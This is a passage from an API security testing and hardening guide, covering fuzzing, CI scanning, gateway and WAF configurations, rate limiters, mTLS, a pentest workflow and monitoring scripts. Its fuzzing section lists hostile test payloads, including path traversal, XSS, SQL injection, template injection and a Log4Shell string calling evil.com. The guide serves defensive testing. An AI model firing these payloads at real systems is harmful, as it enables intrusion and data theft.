  -l High \
  https://api.target.com

# ZAP with OpenAPI import
zap-cli openapi-import -f openapi.json -t https://api.target.com
zap-cli active-scan https://api.target.com
```

### 8.5 Custom Fuzzing with Python — Hypothesis Library

```python
from hypothesis import given, strategies as st, assume, settings, HealthCheck
import httpx
import string

# Strategy: Generate boundary-value inputs
boundary_strings = st.one_of(
    st.just(""),                                    # Empty
    st.just("a" * 10000),                          # Very long
    st.just("\x00"),                                # Null byte
    st.just("../../../etc/passwd"),                 # Path traversal
    st.just("<script>alert(1)</script>"),           # XSS
    st.just("' OR '1'='1"),                        # SQLi
    st.just("{{7*7}}"),                            # SSTI
    st.just("${jndi:ldap://evil.com/x}"),          # Log4Shell
    st.text(alphabet=string.printable, max_size=500),
    st.binary(max_size=200).map(lambda b: b.hex()),
)

# Strategy: Generate malformed JSON
malformed_json = st.one_of(
    st.just(""),
    st.just("null"),
    st.just("[]"),
    st.just("{}"),
    st.just('{"a":' * 100 + '"x"' + '}' * 100),  # Deep nesting
    st.just('{"a": undefined}'),                    # Invalid JSON value
)

@given(payload=boundary_strings)
@settings(max_examples=500, suppress_health_check=[HealthCheck.too_slow])
def test_input_handling(payload):
    """Fuzz all string parameters with boundary values."""
    r = httpx.post("https://api.target.com/v1/search",
                   json={"query": payload}, headers=auth, timeout=10)
    
    # Server should never crash
    assert r.status_code < 500, f"5xx with input: {repr(payload[:100])}"
    # Should not reflect unsanitized input
    if r.status_code < 400:
        assert "<script>" not in r.text
```

### 8.6 Continuous API Security Testing in CI/CD

```yaml
# GitHub Actions workflow for continuous API security testing
name: API Security Testing
on:
  push:
    paths: ['src/api/**', 'openapi.yaml']
  schedule:
    - cron: '0 2 * * 1'  # Weekly Monday 2 AM

jobs:
  api-security:
    runs-on: ubuntu-latest
    services:
      api:
        image: ${{ github.repository }}:${{ github.sha }}
        ports: ['8080:8080']
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Schema validation
        run: |
          npx @stoplight/spectral-cli lint openapi.yaml \
            --ruleset .spectral-security.yaml
      
      - name: Schemathesis fuzzing
        run: |
          pip install schemathesis
          schemathesis run http://localhost:8080/openapi.json \
            --checks all \
            --stateful=links \
            --hypothesis-max-examples=200 \
            --exit-first
      
      - name: OWASP ZAP scan
        uses: zaproxy/action-api-scan@v0.7.0
        with:
          target: 'http://localhost:8080/openapi.json'
          format: openapi
          fail_action: true
      
      - name: Authorization matrix test
        run: |
          python tests/security/test_authorization_matrix.py
```

### 8.7 Contract Testing as Security Control

API contracts (OpenAPI, AsyncAPI, Protobuf definitions) serve as security controls when enforced at runtime:

```python
# Contract-based security testing with Dredd
# dredd.yml
"""
reporter: apiary
dry-run: null
hookfiles: ./hooks.py
language: python
server: npm start
server-wait: 3
init: false
names: false
only: []
header:
  - "Authorization: Bearer test_token"
"""

# hooks.py — Dredd hooks for security validation
import dredd_hooks as hooks

@hooks.before_each
def inject_auth(transaction):
    """Ensure every request has authentication."""
    transaction['request']['headers']['Authorization'] = f'Bearer {get_test_token()}'

@hooks.after_each
def validate_security_headers(transaction):
    """Verify security headers are present on all responses."""
    headers = transaction['real']['headers']
    required = ['x-content-type-options', 'x-frame-options', 'strict-transport-security']
    for header in required:
        assert header in headers, f"Missing security header: {header}"
```

---

## 9. API Security Architecture

### 9.1 API Gateway Hardening

#### Kong Configuration

```yaml
# kong.yml — Security-focused configuration
_format_version: "3.0"

services:
  - name: backend-api
    url: http://internal-api:8080
    routes:
      - name: public-api
        paths: ["/api/v1"]
        strip_path: true

plugins:
  # Rate limiting
  - name: rate-limiting
    config:
      minute: 60
      hour: 1000
      policy: redis
      redis_host: redis
      redis_port: 6379
      fault_tolerant: false
      hide_client_headers: false

  # Request size limiting
  - name: request-size-limiting
    config:
      allowed_payload_size: 1  # MB
      size_unit: megabytes
      require_content_length: true

  # IP restriction for admin routes
  - name: ip-restriction
    route: admin-routes
    config:
      allow: ["10.0.0.0/8"]
      deny: []

  # Bot detection
  - name: bot-detection
    config:
      deny: ["curl", "python-requests"]
      allow: []

  # Correlation ID for tracing
  - name: correlation-id
    config:
      header_name: X-Request-ID
      generator: uuid#counter
      echo_downstream: true

  # CORS hardening
  - name: cors
    config:
      origins: ["https://app.example.com"]
      methods: ["GET", "POST", "PUT", "DELETE"]
      headers: ["Authorization", "Content-Type"]
      credentials: true
      max_age: 3600
```

#### Envoy Proxy Configuration

```yaml
# envoy.yaml — Security-focused listener configuration
static_resources:
  listeners:
    - name: api_listener
      address:
        socket_address:
          address: 0.0.0.0
          port_value: 8443
      filter_chains:
        - transport_socket:
            name: envoy.transport_sockets.tls
            typed_config:
              "@type": type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext
              common_tls_context:
                tls_params:
                  tls_minimum_protocol_version: TLSv1_3
                  cipher_suites: ["TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"]
                tls_certificates:
                  - certificate_chain: {filename: "/certs/server.crt"}
                    private_key: {filename: "/certs/server.key"}
                validation_context:
                  trusted_ca: {filename: "/certs/ca.crt"}
              require_client_certificate: true
          filters:
            - name: envoy.filters.network.http_connection_manager
              typed_config:
                "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
                stat_prefix: api_ingress
                use_remote_address: true
                common_http_protocol_options:
                  idle_timeout: 60s
                  headers_with_underscores_action: REJECT_REQUEST
                  max_headers_count: 50
                http_filters:
                  # Rate limiting
                  - name: envoy.filters.http.ratelimit
                    typed_config:
                      "@type": type.googleapis.com/envoy.extensions.filters.http.ratelimit.v3.RateLimit
                      domain: api
                      request_type: external
                      rate_limit_service:
                        grpc_service:
                          envoy_grpc:
                            cluster_name: ratelimit_service
                  # JWT authentication
                  - name: envoy.filters.http.jwt_authn
                    typed_config:
                      "@type": type.googleapis.com/envoy.extensions.filters.http.jwt_authn.v3.JwtAuthentication
                      providers:
                        auth_provider:
                          issuer: "https://auth.example.com"
                          audiences: ["api.example.com"]
                          remote_jwks:
                            http_uri:
                              uri: "https://auth.example.com/.well-known/jwks.json"
                              cluster: auth_cluster
                              timeout: 5s
                            cache_duration: 600s
```

#### AWS API Gateway Security

```python
# AWS CDK — API Gateway with security controls
from aws_cdk import (
    aws_apigateway as apigw,
    aws_wafv2 as wafv2,
    aws_lambda as lambda_,
)

# API Gateway with request validation
api = apigw.RestApi(
    self, "SecureAPI",
    rest_api_name="Secure API",
    deploy_options=apigw.StageOptions(
        logging_level=apigw.MethodLoggingLevel.INFO,
        data_trace_enabled=False,  # Don't log request/response bodies
        metrics_enabled=True,
        throttling_rate_limit=100,
        throttling_burst_limit=50,
    ),
    endpoint_configuration=apigw.EndpointConfiguration(
        types=[apigw.EndpointType.REGIONAL]
    ),
    policy=iam.PolicyDocument(
        statements=[
            iam.PolicyStatement(
                effect=iam.Effect.DENY,
                principals=[iam.AnyPrincipal()],
                actions=["execute-api:Invoke"],
                conditions={"StringNotEquals": {"aws:SourceVpc": "vpc-123456"}}
            )
        ]
    )
)

# Request validator
validator = api.add_request_validator(
    "RequestValidator",
    validate_request_body=True,
    validate_request_parameters=True
)
```

### 9.2 WAF Rules for API Protection

```json
{
  "Name": "APISecurityRuleGroup",
  "Rules": [
    {
      "Name": "BlockSQLi",
      "Priority": 1,
      "Statement": {
        "SqliMatchStatement": {
          "FieldToMatch": {"Body": {"OversizeHandling": "MATCH"}},
          "TextTransformations": [
            {"Priority": 0, "Type": "URL_DECODE"},
            {"Priority": 1, "Type": "HTML_ENTITY_DECODE"}
          ]
        }
      },
      "Action": {"Block": {}},
      "VisibilityConfig": {"SampledRequestsEnabled": true}
    },
    {
      "Name": "RateLimitByIP",
      "Priority": 2,
      "Statement": {
        "RateBasedStatement": {
          "Limit": 2000,
          "AggregateKeyType": "IP"
        }
      },
      "Action": {"Block": {}}
    },
    {
      "Name": "BlockLargePayloads",
      "Priority": 3,
      "Statement": {
        "SizeConstraintStatement": {
          "FieldToMatch": {"Body": {}},
          "ComparisonOperator": "GT",
          "Size": 1048576,
          "TextTransformations": [{"Priority": 0, "Type": "NONE"}]
        }
      },
      "Action": {"Block": {}}
    },
    {
      "Name": "RequireContentType",
      "Priority": 4,
      "Statement": {
        "NotStatement": {
          "Statement": {
            "ByteMatchStatement": {
              "FieldToMatch": {"SingleHeader": {"Name": "content-type"}},
              "PositionalConstraint": "STARTS_WITH",
              "SearchString": "application/json",
              "TextTransformations": [{"Priority": 0, "Type": "LOWERCASE"}]
            }
          }
        }
      },
      "Action": {"Block": {}}
    }
  ]
}
```

### 9.3 Request Validation with OpenAPI Schemas

```yaml
# openapi.yaml — Security-focused schema definition
openapi: 3.1.0
info:
  title: Secure API
  version: 2.0.0

paths:
  /users/{userId}:
    get:
      parameters:
        - name: userId
          in: path
          required: true
          schema:
            type: string
            format: uuid
            pattern: "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$"
      responses:
        '200':
          description: User found
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/UserResponse'
        '404':
          $ref: '#/components/responses/NotFound'

  /transfers:
    post:
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/TransferRequest'
      security:
        - bearerAuth: []
        - oauth2: [transfer:write]

components:
  schemas:
    TransferRequest:
      type: object
      required: [to_account, amount, currency]
      additionalProperties: false  # CRITICAL: Reject unknown fields
      properties:
        to_account:
          type: string
          format: uuid
          description: Recipient account ID
        amount:
          type: number
          minimum: 0.01
          maximum: 1000000
          multipleOf: 0.01
        currency:
          type: string
          enum: [USD, EUR, GBP]
          description: ISO 4217 currency code
        reference:
          type: string
          maxLength: 140
          pattern: "^[a-zA-Z0-9 .,\\-]+$"

    UserResponse:
      type: object
      properties:
        id:
          type: string
          format: uuid
        name:
          type: string
        email:
          type: string
          format: email
      # NOTE: No internal fields (password_hash, ssn) exposed

  securitySchemes:
    bearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT
    oauth2:
      type: oauth2
      flows:
        authorizationCode:
          authorizationUrl: https://auth.example.com/authorize
          tokenUrl: https://auth.example.com/token
          scopes:
            transfer:read: Read transfer history
            transfer:write: Create transfers

  responses:
    NotFound:
      description: Resource not found
      content:
        application/json:
          schema:
            type: object
            properties:
              error:
                type: string
                example: "Resource not found"
              # No internal details leaked
```

**Runtime schema validation middleware (Express.js example):**

```javascript
const { OpenApiValidator } = require('express-openapi-validator');

app.use(
  OpenApiValidator.middleware({
    apiSpec: './openapi.yaml',
    validateRequests: {
      allowUnknownQueryParameters: false,
      coerceTypes: false,  // Don't coerce — strict typing
    },
    validateResponses: true,  // Also validate outbound data
    validateSecurity: {
      handlers: {
        bearerAuth: async (req) => {
          const token = req.headers.authorization?.split(' ')[1];
          if (!token) throw new Error('Missing token');
          return verifyJWT(token);
        }
      }
    }
  })
);
```

### 9.4 Rate Limiting Algorithms

#### Token Bucket

```python
import time
import threading

class TokenBucket:
    """
    Token bucket rate limiter.
    Allows burst up to bucket capacity, then enforces sustained rate.
    """
    def __init__(self, capacity: int, refill_rate: float):
        self.capacity = capacity
        self.tokens = capacity
        self.refill_rate = refill_rate  # tokens per second
        self.last_refill = time.monotonic()
        self.lock = threading.Lock()
    
    def consume(self, tokens: int = 1) -> bool:
        with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_refill
            self.tokens = min(self.capacity, self.tokens + elapsed * self.refill_rate)
            self.last_refill = now
            
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False
```

#### Sliding Window Log

```python
import time
from collections import deque

class SlidingWindowLog:
    """
    Sliding window rate limiter using timestamp log.
    More memory-intensive but precise.
    """
    def __init__(self, max_requests: int, window_seconds: float):
        self.max_requests = max_requests
        self.window = window_seconds
        self.requests = deque()
        self.lock = threading.Lock()
    
    def allow(self) -> bool:
        with self.lock:
            now = time.monotonic()
            # Remove timestamps outside the window
            while self.requests and self.requests[0] <= now - self.window:
                self.requests.popleft()
            
            if len(self.requests) < self.max_requests:
                self.requests.append(now)
                return True
            return False
```

#### Leaky Bucket

```python
import time
import threading

class LeakyBucket:
    """
    Leaky bucket rate limiter.
    Processes requests at a constant rate, queuing excess.
    Provides smooth output rate regardless of input burstiness.
    """
    def __init__(self, capacity: int, leak_rate: float):
        self.capacity = capacity
        self.water = 0
        self.leak_rate = leak_rate  # requests drained per second
        self.last_leak = time.monotonic()
        self.lock = threading.Lock()
    
    def allow(self) -> bool:
        with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_leak
            self.water = max(0, self.water - elapsed * self.leak_rate)
            self.last_leak = now
            
            if self.water < self.capacity:
                self.water += 1
                return True
            return False
```

### 9.5 Mutual TLS Implementation

```python
# Server-side mTLS configuration (Python/uvicorn)
import ssl

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.minimum_version = ssl.TLSVersion.TLSv1_3
ssl_context.load_cert_chain(
    certfile="/certs/server.crt",
    keyfile="/certs/server.key"
)
ssl_context.load_verify_locations(cafile="/certs/client-ca.crt")
ssl_context.verify_mode = ssl.CERT_REQUIRED  # Require client cert
ssl_context.check_hostname = False  # We validate CN/SAN manually

# Client identity extraction middleware
def extract_client_identity(request):
    """Extract and validate client identity from mTLS certificate."""
    peer_cert = request.transport.get_extra_info('peercert')
    if not peer_cert:
        raise AuthenticationError("No client certificate provided")
    
    # Extract CN (Common Name)
    subject = dict(x[0] for x in peer_cert['subject'])
    cn = subject.get('commonName', '')
    
    # Extract SANs
    sans = [v for t, v in peer_cert.get('subjectAltName', []) if t == 'DNS']
    
    # Validate against service registry
    if cn not in ALLOWED_SERVICE_CNS:
        raise AuthorizationError(f"Service {cn} not authorized")
    
    return {"service_name": cn, "sans": sans}
```

### 9.6 API Versioning Security Implications

| Strategy | Security Risk | Mitigation |
|----------|--------------|------------|
| URL versioning (`/v1/`, `/v2/`) | Old versions remain accessible with weaker security | Set hard deprecation deadlines, return 410 Gone |
| Header versioning (`Accept: application/vnd.api.v1+json`) | Forgetting to version security middleware | Version-specific security middleware chains |
| Query param (`?version=1`) | Easy to manipulate, cache confusion | Server-side version pinning |

**Key security risks with API versioning:**
- Deprecated versions may lack security patches applied to current versions.
- New auth requirements added in v2 don't protect v1 endpoints.
- Different versions may have different data models — v1 may expose fields removed in v2.
- Version negotiation logic itself can be a vulnerability (fallback to insecure version).

### 9.7 Response Filtering and Data Minimization

```python
# Response filtering middleware — never trust the backend to limit fields

from functools import wraps

# Define allowed response fields per endpoint and role
RESPONSE_SCHEMAS = {
    "GET /users/{id}": {
        "user": ["id", "name", "email", "created_at"],
        "admin": ["id", "name", "email", "created_at", "last_login", "role", "mfa_enabled"],
    },
    "GET /orders/{id}": {
        "user": ["id", "status", "total", "items"],
        "admin": ["id", "status", "total", "items", "internal_notes", "profit_margin"],
    }
}

def filter_response(endpoint: str, role: str, data: dict) -> dict:
    """Remove fields not authorized for the caller's role."""
    allowed_fields = RESPONSE_SCHEMAS.get(endpoint, {}).get(role, [])
    if not allowed_fields:
        return {}  # Default deny
    return {k: v for k, v in data.items() if k in allowed_fields}

# Middleware application
def data_minimization(endpoint_pattern: str):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            response_data = func(*args, **kwargs)
            user_role = get_current_user_role()
            filtered = filter_response(endpoint_pattern, user_role, response_data)
            return filtered
        return wrapper
    return decorator
```

---

## 10. Practical Testing Methodology

### 10.1 Complete API Pentest Engagement Workflow

**Phase 1: Reconnaissance and Scoping (Days 1-2)**

```
1. Obtain API documentation (OpenAPI specs, Postman collections, GraphQL schemas)
2. Identify all API endpoints through:
   - Documentation review
   - Traffic interception (Burp proxy with mobile app / web app)
   - DNS and subdomain enumeration
   - JavaScript/mobile binary analysis
   - Public API registries (SwaggerHub, RapidAPI)
3. Map authentication mechanisms per endpoint
4. Identify technology stack (framework, database, cloud provider)
5. Establish testing accounts with various privilege levels
```

**Phase 2: Authentication and Session Testing (Days 2-3)**

```
1. Test each authentication mechanism:
   - Brute force resistance
   - Token security (JWT attacks, API key strength)
   - Session management (fixation, hijacking, timeout)
   - Multi-factor bypass attempts
2. Test OAuth flows:
   - Redirect URI validation
   - State parameter enforcement
   - PKCE requirement
   - Scope validation
3. Test session lifecycle:
   - Concurrent session limits
   - Session invalidation on logout
   - Session invalidation on password change
   - Token refresh mechanism security
```

**Phase 3: Authorization Testing (Days 3-5)**

```
1. Build authorization matrix:
   - Map: (endpoint, method) × (role, user) → expected result
2. Test BOLA systematically:
   - For each endpoint accepting an object ID
   - Try accessing objects owned by other users
3. Test BFLA:
   - For each administrative function
   - Attempt access with each lower privilege level
4. Test horizontal privilege escalation:
   - Same role, different scope/tenant
5. Test field-level authorization:
   - Mass assignment attempts
   - Hidden field disclosure
```

**Phase 4: Input Validation and Injection (Days 5-7)**

```
1. Identify all input points (path, query, body, headers)
2. Test injection vectors:
   - SQL injection (time-based, error-based, union-based)
   - NoSQL injection (operator injection, JavaScript injection)
   - Command injection
   - LDAP injection
   - XML/XXE (if XML accepted)
   - Server-side template injection
3. Test input validation:
   - Type confusion
   - Boundary values
   - Unicode normalization attacks
   - Parameter pollution
4. Test file upload endpoints:
   - Content-type bypass
   - Extension filtering bypass
   - Path traversal in filename
```

**Phase 5: Business Logic Testing (Days 7-9)**

```
1. Map business workflows
2. Test workflow bypass (skip steps via direct API calls)
3. Test race conditions on financial/state-changing operations
4. Test IDOR chains
5. Test pagination/filtering manipulation
6. Test batch endpoint abuse
7. Test price/quantity manipulation
```

**Phase 6: Infrastructure and Configuration (Days 9-10)**

```
1. TLS configuration assessment
2. CORS policy testing
3. Security header review
4. Error handling (information leakage)
5. Rate limiting effectiveness
6. API gateway bypass attempts
7. Versioning security (old version access)
```

### 10.2 Tool Chain

**Primary tool setup:**

```bash
# Burp Suite Professional with extensions
# Install extensions via BApp Store:
# - InQL (GraphQL)
# - JWT Editor
# - Autorize
# - Param Miner
# - Logger++
# - Active Scan++
# - Hackvertor

# Postman/Insomnia for API exploration
# Import OpenAPI spec for auto-generated collections

# CLI tools
pip install httpx schemathesis mitmproxy
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
go install github.com/tomnomnom/gf@latest
npm install -g @stoplight/spectral-cli
```

**Integration workflow:**

```
1. Import API spec into Postman/Insomnia
2. Route traffic through Burp Suite proxy
3. Use Postman for manual exploration
4. Use Burp for interception and manipulation
5. Use custom scripts for automation
6. Use Schemathesis for schema-based fuzzing
7. Document findings in structured format
```

### 10.3 Automated Reconnaissance with API Specifications

```python
import httpx
import yaml
import json
from pathlib import Path

class APIRecon:
    """Automated reconnaissance from API specifications."""
    
    def __init__(self, spec_url: str, auth_token: str):
        self.spec = self._load_spec(spec_url)
        self.auth = {"Authorization": f"Bearer {auth_token}"}
        self.findings = []
    
    def _load_spec(self, url: str) -> dict:
        r = httpx.get(url)
        if url.endswith('.yaml') or url.endswith('.yml'):
            return yaml.safe_load(r.text)
        return r.json()
    
    def enumerate_endpoints(self) -> list[dict]:
        """Extract all endpoints with parameters and security requirements."""
        endpoints = []
        base_url = self.spec.get("servers", [{}])[0].get("url", "")
        
        for path, methods in self.spec.get("paths", {}).items():
            for method, details in methods.items():
                if method in ("get", "post", "put", "delete", "patch"):
                    endpoints.append({
                        "method": method.upper(),
                        "path": path,
                        "url": f"{base_url}{path}",
                        "parameters": details.get("parameters", []),
                        "security": details.get("security", []),
                        "request_body": details.get("requestBody"),
                        "deprecated": details.get("deprecated", False),
                    })
        return endpoints
    
    def find_sensitive_endpoints(self) -> list[dict]:
        """Identify endpoints handling sensitive data."""
        sensitive_keywords = [
            "password", "token", "secret", "key", "credit", "ssn",
            "admin", "internal", "debug", "config", "delete", "export"
        ]
        results = []
        for ep in self.enumerate_endpoints():
            path_lower = ep["path"].lower()
            if any(kw in path_lower for kw in sensitive_keywords):
                results.append(ep)
        return results
    
    def find_unprotected_endpoints(self) -> list[dict]:
        """Find endpoints without declared security requirements."""
        return [ep for ep in self.enumerate_endpoints() if not ep["security"]]
    
    def find_deprecated_endpoints(self) -> list[dict]:
        """Find deprecated but still accessible endpoints."""
        deprecated = [ep for ep in self.enumerate_endpoints() if ep["deprecated"]]
        accessible = []
        for ep in deprecated:
            r = httpx.request(ep["method"], ep["url"], headers=self.auth, timeout=5)
            if r.status_code not in (404, 410):
                accessible.append({**ep, "status_code": r.status_code})
        return accessible
    
    def test_object_id_params(self) -> list[dict]:
        """Identify endpoints with object IDs for BOLA testing."""
        import re
        pattern = re.compile(r'\{(\w*[Ii]d\w*)\}')
        return [ep for ep in self.enumerate_endpoints() 
                if pattern.search(ep["path"])]
    
    def generate_report(self) -> dict:
        return {
            "total_endpoints": len(self.enumerate_endpoints()),
            "sensitive_endpoints": self.find_sensitive_endpoints(),
            "unprotected_endpoints": self.find_unprotected_endpoints(),
            "deprecated_accessible": self.find_deprecated_endpoints(),
            "bola_candidates": self.test_object_id_params(),
        }
```

### 10.4 Reporting API Vulnerabilities — Severity Assessment

**API-specific CVSS adjustments:**

| Factor | Impact on Score |
|--------|----------------|
| Unauthenticated access required | +1.0 (lower attack complexity) |
| Automated exploitation possible | +0.5 (scriptable at scale) |
| Business data exposure | Score based on data classification |
| Multi-tenant impact | +1.0 (affects multiple organizations) |
| Rate limiting absence | Increases exploitability of any finding |

**Report structure for API vulnerabilities:**

```markdown
## Finding: BOLA in /api/v1/invoices/{id}

### Classification
- **CVSS 3.1:** 7.5 (High)
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP API:** API1:2023 - Broken Object Level Authorization

### Description
The `/api/v1/invoices/{id}` endpoint returns invoice data for any valid 
invoice ID regardless of the authenticated user's ownership. Sequential 
integer IDs enable enumeration of all invoices in the system.

### Reproduction
1. Authenticate as User A (account: test_user_a@example.com)
2. Note User A's invoice ID from /api/v1/invoices: `INV-1001`
3. Increment ID and request: `GET /api/v1/invoices/INV-1002`
4. Response returns User B's invoice with full financial details

### Evidence
[Request/response captures with timestamps in UTC ISO 8601]

### Impact
- Exposure of all customer invoices (~45,000 records)
- Financial data disclosure (amounts, payment methods, addresses)
- Potential PCI DSS compliance violation

### Remediation
1. Implement object-level authorization check:
   `WHERE invoice_id = :id AND owner_id = :current_user_id`
2. Replace sequential IDs with UUIDv4
3. Add rate limiting to prevent bulk enumeration
4. Implement anomaly detection for cross-account access patterns

### Verification
After fix deployed, repeat steps 1-4 and confirm HTTP 403 response.
```

### 10.5 Remediation Guidance

**Priority remediation matrix:**

| Vulnerability Class | Quick Fix | Proper Fix | Timeline |
|-------------------|-----------|-----------|----------|
| BOLA | Add ownership check to query | Implement ABAC middleware | 24-48h |
| Broken Auth | Patch specific flaw | Implement auth framework | 1 week |
| Mass Assignment | Add field allowlist | Implement DTO layer | 48h |
| Rate Limit Bypass | Fix specific bypass | Implement distributed rate limiting | 1 week |
| JWT Algorithm Confusion | Hardcode expected algorithm | Migrate to asymmetric only | 24h |
| SSRF | Block private IPs | Implement egress proxy | 48h |

**Secure coding patterns to recommend:**

```python
# Pattern 1: Object-level authorization decorator
def authorize_object(model_class, id_param="id", owner_field="user_id"):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            object_id = kwargs.get(id_param)
            current_user = get_current_user()
            obj = model_class.get(object_id)
            if not obj:
                raise NotFoundError()
            if getattr(obj, owner_field) != current_user.id:
                raise ForbiddenError()
            kwargs['obj'] = obj
            return func(*args, **kwargs)
        return wrapper
    return decorator

# Pattern 2: Explicit response schema
class UserResponseSchema:
    """Only expose these fields — everything else is stripped."""
    ALLOWED_FIELDS = frozenset(["id", "name", "email", "avatar_url", "created_at"])
    
    @classmethod
    def serialize(cls, user_model) -> dict:
        data = user_model.to_dict()
        return {k: v for k, v in data.items() if k in cls.ALLOWED_FIELDS}

# Pattern 3: Immutable rate limit state
from dataclasses import dataclass, replace

@dataclass(frozen=True)
class RateLimitState:
    tokens: float
    last_refill: float
    
    def consume(self, now: float, refill_rate: float, capacity: float) -> tuple['RateLimitState', bool]:
        elapsed = now - self.last_refill
        new_tokens = min(capacity, self.tokens + elapsed * refill_rate)
        if new_tokens >= 1:
            return replace(self, tokens=new_tokens - 1, last_refill=now), True
        return replace(self, last_refill=now), False
```

### 10.6 Continuous Monitoring Post-Fix

```python
# Continuous API security monitoring script
import httpx
import time
import json
from datetime import datetime, timezone

class APISecurityMonitor:
    """Post-remediation continuous verification."""
    
    def __init__(self, config_path: str):
        with open(config_path) as f:
            self.config = json.load(f)
        self.alerts = []
    
    def check_bola_regression(self):
        """Verify BOLA fixes remain effective."""
        for test_case in self.config["bola_tests"]:
            r = httpx.get(
                test_case["url"],
                headers={"Authorization": f"Bearer {test_case['cross_user_token']}"},
                timeout=10
            )
            if r.status_code == 200:
                self.alert("BOLA_REGRESSION", test_case["url"], r.status_code)
    
    def check_auth_endpoints(self):
        """Verify authentication endpoints resist common attacks."""
        for endpoint in self.config["auth_endpoints"]:
            # Test without auth
            r = httpx.request(endpoint["method"], endpoint["url"], timeout=10)
            if r.status_code not in (401, 403):
                self.alert("AUTH_BYPASS", endpoint["url"], r.status_code)
    
    def check_rate_limits(self):
        """Verify rate limiting is active."""
        for endpoint in self.config["rate_limited_endpoints"]:
            responses = []
            for _ in range(endpoint["expected_limit"] + 10):
                r = httpx.get(endpoint["url"], headers=self.config["auth_headers"])
                responses.append(r.status_code)
            
            rate_limited = responses.count(429)
            if rate_limited == 0:
                self.alert("RATE_LIMIT_INACTIVE", endpoint["url"], 
                          f"0/{endpoint['expected_limit']} requests limited")
    
    def check_security_headers(self):
        """Verify security headers are present."""
        required_headers = [
            "strict-transport-security",
            "x-content-type-options",
            "x-frame-options",
        ]
        for endpoint in self.config["monitored_endpoints"]:
            r = httpx.get(endpoint, headers=self.config["auth_headers"], timeout=10)
            for header in required_headers:
                if header not in r.headers:
                    self.alert("MISSING_HEADER", endpoint, f"Missing: {header}")
    
    def alert(self, alert_type: str, target: str, detail: str):
        alert = {
            "type": alert_type,
            "target": target,
            "detail": detail,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        self.alerts.append(alert)
        # Send to alerting system (PagerDuty, Slack, etc.)
        print(f"[ALERT] {alert_type}: {target} - {detail}")
    
    def run(self):
        """Execute all monitoring checks."""
        self.check_bola_regression()
        self.check_auth_endpoints()
        self.check_rate_limits()
        self.check_security_headers()
        return self.alerts
```

**Monitoring configuration example:**

```json
{
  "bola_tests": [
    {
      "url": "https://api.target.com/v1/invoices/INV-1001",
      "cross_user_token": "token_for_user_who_should_not_access_inv_1001",
      "expected_status": 403
    }
  ],
  "auth_endpoints": [
    {"method": "GET", "url": "https://api.target.com/v1/users/me"},
    {"method": "GET", "url": "https://api.target.com/v1/admin/config"}
  ],
  "rate_limited_endpoints": [
    {"url": "https://api.target.com/v1/auth/login", "expected_limit": 5}
  ],
  "auth_headers": {"Authorization": "Bearer monitoring_service_token"},
  "monitored_endpoints": [
    "https://api.target.com/v1/health",
    "https://api.target.com/v1/users/me"
  ]
}
```

---

## Appendix A: Burp Suite Configuration for API Testing

### Project-Level Settings

```json
{
  "target": {
    "scope": {
      "include": [
        {"enabled": true, "protocol": "https", "host": "api.target.com"},
        {"enabled": true, "protocol": "wss", "host": "ws.target.com"},
        {"enabled": true, "protocol": "https", "host": "graphql.target.com"}
      ]
    }
  },
  "proxy": {
    "request_interception_rules": [
      {"match_type": "url", "match_condition": "matches", "match_value": "api\\.target\\.com"}
    ],
    "response_interception_rules": [
      {"match_type": "header", "match_condition": "contains", "match_value": "Set-Cookie"}
    ]
  },
  "scanner": {
    "insertion_points": {
      "url_path_filename": true,
      "url_path_folder": true,
      "body_params": true,
      "url_params": true,
      "cookies": true,
      "headers": true,
      "json_params": true,
      "amf_params": false
    }
  }
}
```

### Session Handling Rules for JWT Refresh

```
1. Burp > Project Options > Sessions
2. Add Session Handling Rule:
   - Rule Actions: Run macro (to refresh JWT)
   - Macro: 
     POST /auth/refresh with current refresh_token
     Extract: access_token from response JSON
   - Scope: Target domain only
   - Trigger: When response contains "401" or "token_expired"
```

## Appendix B: Quick Reference — gRPC Testing with grpcurl

```bash
# Discovery
grpcurl -plaintext localhost:50051 list
grpcurl -plaintext localhost:50051 describe <ServiceName>
grpcurl -plaintext localhost:50051 describe <MessageType>

# Unary call
grpcurl -plaintext -d '{"id": 1}' localhost:50051 pkg.Service/Method

# With TLS
grpcurl -cert client.crt -key client.key -cacert ca.crt \
  target.com:443 pkg.Service/Method

# With metadata (headers)
grpcurl -plaintext \
  -H "Authorization: Bearer token" \
  -H "X-Request-ID: test-123" \
  -d '{"user_id": 1}' \
  localhost:50051 user.UserService/GetUser

# Server streaming
grpcurl -plaintext -d '{"query": "test"}' \
  localhost:50051 search.SearchService/StreamResults

# Client streaming (from file)
grpcurl -plaintext -d @ localhost:50051 upload.UploadService/Upload < messages.json

# With proto file (no reflection needed)
grpcurl -plaintext -import-path ./protos -proto service.proto \
  -d '{"id": 1}' localhost:50051 pkg.Service/Method

# Output as JSON
grpcurl -plaintext -format json -d '{"id": 1}' \
  localhost:50051 pkg.Service/Method
```

## Appendix C: OpenAPI Security Annotations

```yaml
# .spectral-security.yaml — Custom Spectral rules for API security linting
extends: ["spectral:oas"]

rules:
  # Require security on all operations
  operation-security-defined:
    description: Every operation must have security requirements
    severity: error
    given: "$.paths[*][get,post,put,delete,patch]"
    then:
      field: security
      function: truthy

  # Block sensitive data in path parameters
  no-sensitive-path-params:
    description: Sensitive fields should not appear in URL paths
    severity: error
    given: "$.paths[*].parameters[?(@.in=='path')]"
    then:
      field: name
      function: pattern
      functionOptions:
        notMatch: "(password|token|secret|key|ssn|credit_card)"

  # Require rate limiting documentation
  rate-limit-documented:
